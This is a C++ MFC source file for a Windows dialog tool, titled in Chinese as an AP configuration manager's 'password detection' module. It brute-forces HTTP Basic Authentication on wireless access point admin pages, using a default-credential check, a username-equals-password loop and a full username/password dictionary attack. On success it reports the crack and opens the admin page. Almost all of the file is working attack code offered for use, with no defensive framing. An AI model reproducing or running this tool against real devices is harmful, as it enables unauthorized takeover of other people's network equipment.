// InternetDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Internet.h"
#include "InternetDlg.h"
#include "CBase64.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


extern CInternetApp theApp;
/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();
	
	// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA
	
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL
	
	// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
//{{AFX_MSG_MAP(CAboutDlg)
// No message handlers
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CInternetDlg dialog

CInternetDlg::CInternetDlg(CWnd* pParent /*=NULL*/)
: CDialog(CInternetDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CInternetDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CInternetDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CInternetDlg)
	DDX_Control(pDX, IDC_IPADDRESS2, m_SetApAddress);
	DDX_Control(pDX, IDC_IPADDRESS1, m_ApAddress);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CInternetDlg, CDialog)
//{{AFX_MSG_MAP(CInternetDlg)
ON_WM_SYSCOMMAND()
ON_WM_PAINT()
ON_WM_QUERYDRAGICON()
ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
ON_CBN_SELCHANGE(IDC_COMBO1, OnSelchangeCombo1)
ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	ON_BN_CLICKED(IDC_BUTTON4, OnButton4)
	ON_BN_CLICKED(IDC_BUTTON5, OnButton5)
	ON_BN_CLICKED(IDC_BUTTON6, OnButton6)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CInternetDlg message handlers

BOOL CInternetDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	
	// Add "About..." menu item to system menu.
	
	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	CString path,temp;
	GetCurrentPath(path);
	path += "AP.ini";
	char buffer[1024];
	GetPrivateProfileSectionNames(buffer, 1024, path);
	((CComboBox*)GetDlgItem(IDC_COMBO1))->ResetContent();
	for (char *tt=(LPTSTR)buffer; *tt; tt += strlen(tt)+1)
	{
		((CComboBox*)GetDlgItem(IDC_COMBO1))->AddString(tt);
	}
	
	theApp.m_pszAppName = "AP配置管理系统——密码探测";
	
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CInternetDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CInternetDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting
		
		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);
		
		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		
		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CInternetDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CInternetDlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	CBase64 base64;
	m_Session = new CInternetSession;
	m_httpConnect = NULL;
	BYTE byte0,byte1,byte2,byte3;
	int nCount = 0;
	
	nCount = m_ApAddress.GetAddress(byte0, byte1, byte2, byte3);
	m_strApAddress.Format("%d.%d.%d.%d", byte0, byte1, byte2, byte3);
	
	if (nCount != 4)
	{
		AfxMessageBox("输入的IP地址不完整",MB_OK|MB_ICONINFORMATION);
		return;
	}
	
	if (m_strUserName.IsEmpty() || m_strPassWord.IsEmpty())
	{
		AfxMessageBox("用户名或密码为空,请重新输入用户名和密码", MB_OK|MB_ICONINFORMATION);
		return;
		
	}
	
	m_strUserName.TrimLeft();
	m_strUserName.TrimRight();
	m_strPassWord.TrimLeft();
	m_strPassWord.TrimRight();
	m_strUserAndPwd = m_strUserName + ":" + m_strPassWord;
	
	char *cUserPassword = (LPTSTR)(LPCTSTR)m_strUserAndPwd;
	LPTSTR pEncodeOutPut;
	base64.CreateMatchingEncodingBuffer(strlen(cUserPassword), &pEncodeOutPut);
	base64.EncodeBuffer(cUserPassword, strlen(cUserPassword), pEncodeOutPut);
	
	try
	{
		
		m_httpConnect = m_Session->GetHttpConnection(m_strApAddress, INTERNET_PORT(80));
		if (m_httpConnect)
		{
			
			CHttpFile *httpfile;
			httpfile = m_httpConnect->OpenRequest(1,"/");
			CString temp;
			temp.Format("Authorization: Basic %s", pEncodeOutPut);
			httpfile->AddRequestHeaders("GET / HTTP/1.1");
			//httpfile->AddRequestHeaders("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*");
			//httpfile->AddRequestHeaders("Accept-Language: zh-cn");
			//	httpfile->AddRequestHeaders("Accept-Encoding: gzip, deflate");
			//	httpfile->AddRequestHeaders("User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 2.0.50727)");
			//	httpfile->AddRequestHeaders("Host: 192.168.2.1");
			//	httpfile->AddRequestHeaders("Connection: Keep-Alive");
			httpfile->AddRequestHeaders(temp);
			temp = "";
			BOOL bFlag = httpfile->SendRequest(NULL,0,temp.GetBuffer(0), temp.GetLength());
			if(!bFlag)
			{
				AfxMessageBox("请求失败");
				return;
			}
			DWORD dwStatus;
			httpfile->QueryInfoStatusCode(dwStatus);
			if (dwStatus>=200 && dwStatus<=299)
			{
				CString strIeAddress;
				strIeAddress.Format("http://%s@%s", cUserPassword, m_strApAddress);
				if(IDOK == AfxMessageBox("破解成功，点击确定进入AP管理页面", MB_OKCANCEL|MB_ICONINFORMATION))
				{
					ShellExecute(NULL, "Open", "IEXPLORE.EXE", strIeAddress,"", SW_SHOWNORMAL);
				}
				

				SetDlgItemText(IDC_EDIT1, m_strUserName);
				SetDlgItemText(IDC_EDIT2, m_strPassWord);
				
			}
			else
			{
				AfxMessageBox("默认用户名密码已被修改，破解失败!", MB_OK|MB_ICONINFORMATION);
			}
			char buffer[2000];
			memset(buffer,0, 2000);
			httpfile->Read(buffer, 2000);
			
		}
		
	}
	catch(CInternetException *pEx)
	{
		char szError[1024];
		if(pEx->GetErrorMessage(szError, 1024))
		{
			AfxMessageBox(szError);
		}
		else
			AfxMessageBox("error");
		pEx->Delete();
		m_httpConnect = NULL;
		
	}
}

void GetCurrentPath(CString &strPath)
{
    char filepath[MAX_PATH];
    GetModuleFileName(NULL, filepath, MAX_PATH);
	strPath = filepath;
    int length = strPath.ReverseFind('\\');
    strPath = strPath.Left(length+1);
}

void ConvertIPtoInt(BYTE &byte0,BYTE &byte1,BYTE &byte2,BYTE &byte3, CString &strIp)
{
	CString temp;	
	int count, count1,count2;
	count = strIp.Find('.');
	byte0 = atoi(strIp.Left(count));
	count1 = strIp.Find('.', count+1);
	byte1 = atoi(strIp.Mid(count+1, 3));
	count2 = strIp.Find('.', count1+1);
	byte2 = atoi(strIp.Mid(count1+1, 3));
	byte3 = atoi(strIp.Right(strIp.GetLength()-count2-1));
}


void CInternetDlg::OnSelchangeCombo1() 
{
	// TODO: Add your control notification handler code here
	BYTE byte0,byte1,byte2,byte3;
	CString strIp,path,temp;
	int nCount;
	char buffer[50];
	
	nCount = ((CComboBox*)GetDlgItem(IDC_COMBO1))->GetCurSel();
	((CComboBox*)GetDlgItem(IDC_COMBO1))->GetLBText(nCount, temp);
	
	GetCurrentPath(path);
	path += "AP.ini";
	
	GetPrivateProfileString(temp, "ApAddress", "192.168.1.1",buffer, 50, path);
	strIp = buffer;
	ConvertIPtoInt(byte0,byte1,byte2,byte3,strIp);
	m_ApAddress.SetAddress(byte0,byte1,byte2,byte3);
	
	GetPrivateProfileString(temp, "UserName", "admin",buffer, 50, path);
	m_strUserName = buffer;
	//	SetDlgItemText(IDC_EDIT1, buffer);
	GetPrivateProfileString(temp, "PassWord", "admin",buffer, 50, path);
	m_strPassWord = buffer;
	//SetDlgItemText(IDC_EDIT2, buffer);
	
}

UINT __cdecl UserPwdSame( LPVOID pParam )
{
	CInternetDlg *pDlg = (CInternetDlg *)pParam;
		CBase64 base64;
	pDlg->m_Session = new CInternetSession;
	pDlg->m_httpConnect = NULL;
	BYTE byte0,byte1,byte2,byte3;
	int nCount = 0;
	CStdioFile userfile,pwdfile;
	BOOL bSearch = FALSE;
	
	nCount = pDlg->m_ApAddress.GetAddress(byte0, byte1, byte2, byte3);
	pDlg->m_strApAddress.Format("%d.%d.%d.%d", byte0, byte1, byte2, byte3);
	
	if (nCount != 4)
	{
		AfxMessageBox("输入的IP地址不完整",MB_OK|MB_ICONINFORMATION);
		return 0;
	}
	
	try
	{
		
		userfile.Open("UserName.txt", CFile::modeRead|CFile::shareDenyWrite);
	
			while (userfile.ReadString(pDlg->m_strUserName))
			{
				
				pDlg->m_strUserName.TrimLeft();
				pDlg->m_strUserName.TrimRight();
				pDlg->m_strPassWord = pDlg->m_strUserName;
				pDlg->SetDlgItemText(IDC_EDIT1, pDlg->m_strUserName);
				pDlg->SetDlgItemText(IDC_EDIT2, pDlg->m_strPassWord);
				pDlg->m_strUserAndPwd = pDlg->m_strUserName + ":" + pDlg->m_strPassWord;
				
				char *cUserPassword = (LPTSTR)(LPCTSTR)pDlg->m_strUserAndPwd;
				LPTSTR pEncodeOutPut;
				base64.CreateMatchingEncodingBuffer(strlen(cUserPassword), &pEncodeOutPut);
				base64.EncodeBuffer(cUserPassword, strlen(cUserPassword), pEncodeOutPut);
				
				//Sleep(1000);
				
			    pDlg->m_httpConnect = pDlg->m_Session->GetHttpConnection(pDlg->m_strApAddress, INTERNET_PORT(80));
				if (pDlg->m_httpConnect)
				{
					
					CHttpFile *httpfile;
					httpfile = pDlg->m_httpConnect->OpenRequest(1,"/");
					CString temp;
					temp.Format("Authorization: Basic %s", pEncodeOutPut);
					httpfile->AddRequestHeaders("GET / HTTP/1.1");
					//httpfile->AddRequestHeaders("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*");
					//httpfile->AddRequestHeaders("Accept-Language: zh-cn");
					//	httpfile->AddRequestHeaders("Accept-Encoding: gzip, deflate");
					//	httpfile->AddRequestHeaders("User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 2.0.50727)");
					//	httpfile->AddRequestHeaders("Host: 192.168.2.1");
					//	httpfile->AddRequestHeaders("Connection: Keep-Alive");
					httpfile->AddRequestHeaders(temp);
					temp = "";
					BOOL bFlag = httpfile->SendRequest(NULL,0,temp.GetBuffer(0), temp.GetLength());
					if(!bFlag)
					{
						AfxMessageBox("请求失败");
						return 0;
					}
					DWORD dwStatus;
					httpfile->QueryInfoStatusCode(dwStatus);
					char buffer[2000];

					if (dwStatus>=200 && dwStatus<=299)
					{
						CString strInfo, strIeAddress;
						strInfo.Format("破解成功\r\n用户名：%s\r\n密码：%s\r\n点击确定进入AP管理页面", \
							pDlg->m_strUserName, pDlg->m_strPassWord);
						strIeAddress.Format("http://%s@%s", cUserPassword, pDlg->m_strApAddress);

						if(IDOK == AfxMessageBox(strInfo, MB_OKCANCEL|MB_ICONINFORMATION))
						{
							ShellExecute(NULL, "Open", "IEXPLORE.EXE", strIeAddress,"", SW_SHOWNORMAL);
						}
						bSearch = TRUE;
						
						break;
					}
					
					httpfile->Read(buffer, 2000);
					httpfile->Close();
					pDlg->m_httpConnect->Close();
					Sleep(450);
				}
				
			}
			userfile.Close();
		
	}
	catch(CInternetException *pEx)
	{
		char szError[1024];
		if(pEx->GetErrorMessage(szError, 1024))
		{
			AfxMessageBox(szError);
		}
		else
			AfxMessageBox("error");
		pEx->Delete();
		pDlg->m_httpConnect = NULL;
		
	}
	pDlg->m_Session->Close();
	delete pDlg->m_Session;
	if (bSearch)
	{
		return 1;
	}
	else
	{
		pDlg->SetDlgItemText(IDC_EDIT1,"");
		pDlg->SetDlgItemText(IDC_EDIT2,"");
		AfxMessageBox("破解AP管理密码失败", MB_OK|MB_ICONINFORMATION);
		
		return 0;
	}
	
}

void CInternetDlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	AfxBeginThread(UserPwdSame, this);

	
}

UINT __cdecl MyControllingFunction( LPVOID pParam )
{
	CInternetDlg *pDlg = (CInternetDlg *)pParam;
		CBase64 base64;
	pDlg->m_Session = new CInternetSession;
	pDlg->m_httpConnect = NULL;
	BYTE byte0,byte1,byte2,byte3;
	int nCount = 0;
	CStdioFile userfile,pwdfile;
	BOOL bSearch = FALSE;
	
	nCount = pDlg->m_ApAddress.GetAddress(byte0, byte1, byte2, byte3);
	pDlg->m_strApAddress.Format("%d.%d.%d.%d", byte0, byte1, byte2, byte3);
	
	if (nCount != 4)
	{
		AfxMessageBox("输入的IP地址不完整",MB_OK|MB_ICONINFORMATION);
		return 0;
	}
	
	try
	{
		
		userfile.Open("UserName.txt", CFile::modeRead|CFile::shareDenyWrite);
	
		
		while(userfile.ReadString(pDlg->m_strUserName))
		{
			if (bSearch)
				{
					break;
				}
			pDlg->m_strUserName.TrimLeft();
			pDlg->m_strUserName.TrimRight();
				pwdfile.Open("PassWord.txt",CFile::modeRead|CFile::shareDenyWrite);
			while (pwdfile.ReadString(pDlg->m_strPassWord))
			{
				
				pDlg->m_strPassWord.TrimLeft();
				pDlg->m_strPassWord.TrimRight();
				pDlg->SetDlgItemText(IDC_EDIT1, pDlg->m_strUserName);
				pDlg->SetDlgItemText(IDC_EDIT2, pDlg->m_strPassWord);
				pDlg->m_strUserAndPwd = pDlg->m_strUserName + ":" + pDlg->m_strPassWord;
				
				char *cUserPassword = (LPTSTR)(LPCTSTR)pDlg->m_strUserAndPwd;
				LPTSTR pEncodeOutPut;
				base64.CreateMatchingEncodingBuffer(strlen(cUserPassword), &pEncodeOutPut);
				base64.EncodeBuffer(cUserPassword, strlen(cUserPassword), pEncodeOutPut);
				
				//Sleep(1000);
				
			    pDlg->m_httpConnect = pDlg->m_Session->GetHttpConnection(pDlg->m_strApAddress, INTERNET_PORT(80));
				if (pDlg->m_httpConnect)
				{
					
					CHttpFile *httpfile;
					httpfile = pDlg->m_httpConnect->OpenRequest(1,"/");
					CString temp;
					temp.Format("Authorization: Basic %s", pEncodeOutPut);
					httpfile->AddRequestHeaders("GET / HTTP/1.1");
					//httpfile->AddRequestHeaders("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*");
					//httpfile->AddRequestHeaders("Accept-Language: zh-cn");
					//	httpfile->AddRequestHeaders("Accept-Encoding: gzip, deflate");
					//	httpfile->AddRequestHeaders("User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 2.0.50727)");
					//	httpfile->AddRequestHeaders("Host: 192.168.2.1");
					//	httpfile->AddRequestHeaders("Connection: Keep-Alive");
					httpfile->AddRequestHeaders(temp);
					temp = "";
					BOOL bFlag = httpfile->SendRequest(NULL,0,temp.GetBuffer(0), temp.GetLength());
					if(!bFlag)
					{
						AfxMessageBox("请求失败");
						return 0;
					}
					DWORD dwStatus;
					httpfile->QueryInfoStatusCode(dwStatus);
					char buffer[2000];

					if (dwStatus>=200 && dwStatus<=299)
					{
						CString strInfo, strIeAddress;
						strInfo.Format("破解成功\r\n用户名：%s\r\n密码：%s\r\n点击确定进入AP管理页面", \
							pDlg->m_strUserName, pDlg->m_strPassWord);
						strIeAddress.Format("http://%s@%s", cUserPassword, pDlg->m_strApAddress);

						if(IDOK == AfxMessageBox(strInfo, MB_OKCANCEL|MB_ICONINFORMATION))
						{
							ShellExecute(NULL, "Open", "IEXPLORE.EXE", strIeAddress,"", SW_SHOWNORMAL);
						}
						bSearch = TRUE;
						
						break;
					}
					
					httpfile->Read(buffer, 2000);
					httpfile->Close();
					pDlg->m_httpConnect->Close();
					Sleep(450);
					
				}
				
			}
			pwdfile.Close();
		}
		
		userfile.Close();
		
	}
	catch(CInternetException *pEx)
	{
		char szError[1024];
		if(pEx->GetErrorMessage(szError, 1024))
		{
			AfxMessageBox(szError);
		}
		else
			AfxMessageBox("error");
		pEx->Delete();
		pDlg->m_httpConnect = NULL;
		
	}
	pDlg->m_Session->Close();
	delete pDlg->m_Session;
	if (bSearch)
	{
		return 1;
	}
	else
	{
		pDlg->SetDlgItemText(IDC_EDIT1,"");
		pDlg->SetDlgItemText(IDC_EDIT2,"");
		AfxMessageBox("破解AP管理密码失败", MB_OK|MB_ICONINFORMATION);
		
		return 0;
	}
	
}

void CInternetDlg::OnButton3() 
{
	// TODO: Add your control notification handler code here

	AfxBeginThread(MyControllingFunction, this);
}

void CInternetDlg::OnButton4() 
{
	// TODO: Add your control notification handler code here
	CFile userfile;
	m_strUserName = "";
	GetDlgItemText(IDC_EDIT3, m_strUserName);

	if (m_strUserName.IsEmpty())
	{
		AfxMessageBox("用户名不能为空!", MB_OK | MB_ICONINFORMATION);
		SetDlgItemText(IDC_EDIT3, "");
		GetDlgItem(IDC_EDIT3)->SetFocus();
		
		return;
	}
	userfile.Open("UserName.txt", CFile::modeCreate|CFile::modeNoTruncate|CFile::modeWrite);
	userfile.SeekToEnd();
	userfile.Write("\r\n",2);
	userfile.Write(m_strUserName, m_strUserName.GetLength());
	userfile.Close();
	AfxMessageBox("用户名添加完成!");
	SetDlgItemText(IDC_EDIT3, "");	
	GetDlgItem(IDC_EDIT3)->SetFocus();
}

void CInternetDlg::OnButton5() 
{
	// TODO: Add your control notification handler code here
	CString strIniFilePath, strStyle;
	GetCurrentPath(strIniFilePath);
	strIniFilePath += "AP.ini";
	GetDlgItemText(IDC_EDIT5, strStyle);
	BYTE byte0,byte1,byte2,byte3;
	int nCount = 0;
	
	nCount = m_SetApAddress.GetAddress(byte0, byte1, byte2, byte3);
	m_strApAddress.Format("%d.%d.%d.%d", byte0, byte1, byte2, byte3);
	
	if (nCount != 4)
	{
		AfxMessageBox("输入的IP地址不完整",MB_OK|MB_ICONINFORMATION);
		return;
	}
	GetDlgItemText(IDC_EDIT6, m_strUserName);
	GetDlgItemText(IDC_EDIT7, m_strPassWord);
	WritePrivateProfileString(strStyle, "ApAddress", m_strApAddress, strIniFilePath);
	WritePrivateProfileString(strStyle, "UserName", m_strUserName, strIniFilePath);
	WritePrivateProfileString(strStyle, "PassWord", m_strPassWord, strIniFilePath);
	AfxMessageBox("新增AP默认信息添加完成!");
	((CComboBox*)GetDlgItem(IDC_COMBO1))->AddString(strStyle);
	SetDlgItemText(IDC_EDIT5, "");
	SetDlgItemText(IDC_EDIT6, "");
	SetDlgItemText(IDC_EDIT7, "");
	m_SetApAddress.ClearAddress();

	
}

void CInternetDlg::OnButton6() 
{
	// TODO: Add your control notification handler code here
		CFile pwdfile;
	
	m_strPassWord = "";

	GetDlgItemText(IDC_EDIT4, m_strPassWord);
	if (m_strPassWord.IsEmpty())
	{
		AfxMessageBox("密码不能为空!", MB_OK | MB_ICONINFORMATION);
		SetDlgItemText(IDC_EDIT4, "");
		GetDlgItem(IDC_EDIT4)->SetFocus();	
		return;
	}
	pwdfile.Open("PassWord.txt", CFile::modeCreate|CFile::modeNoTruncate|CFile::modeWrite);
	pwdfile.SeekToEnd();
	pwdfile.Write("\r\n",2);
	pwdfile.Write(m_strPassWord, m_strPassWord.GetLength());
	pwdfile.Close();
	AfxMessageBox("密码添加完成!");
	SetDlgItemText(IDC_EDIT4, "");
	GetDlgItem(IDC_EDIT4)->SetFocus();
	
}
